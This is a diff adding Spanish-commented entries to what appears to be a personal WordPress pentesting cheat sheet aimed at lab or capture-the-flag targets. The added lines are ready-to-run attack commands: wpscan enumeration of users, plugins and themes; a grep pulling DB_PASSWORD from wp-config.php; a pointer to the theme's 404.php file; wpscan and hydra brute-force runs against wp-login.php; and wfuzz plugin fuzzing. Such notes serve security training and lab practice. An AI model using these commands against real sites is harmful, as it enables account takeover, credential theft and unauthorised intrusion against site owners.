@@ -1,4 +1,21 @@
 
+# ENUMERR USUARIOS TODOS LOS PLUGINES
+wpscan --url "http://internal.thm/wordpress/" -e vp -e at -e u
+
+# WP-CONFIG
+cat wp-config.php | grep "DB_PASSWORD"
+
+# 404.php
+http://localhost/wordpress/wp-content/themes/twentytwenty/404.php
+
+# FUERZA BRUTA
+wpscan --url http://192.168.0.109/wordpress -U list.txt -P list.txt -t 50 -o wpsca.log
+(no se visualizará el output)
+
+# HYDRA
+hydra localhost -l noroot -P "list.txt" http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2F&testcookie=1:The password you entered for the username noroot is incorrect" -V
+(con falsos positivos)
+
 # FUZZING A PLUGINS
 wfuzz -c -t 400 --hc=404 -w wp-plugins.fuzz.txt http://192.168.0.101/h3l105/FUZZ
 
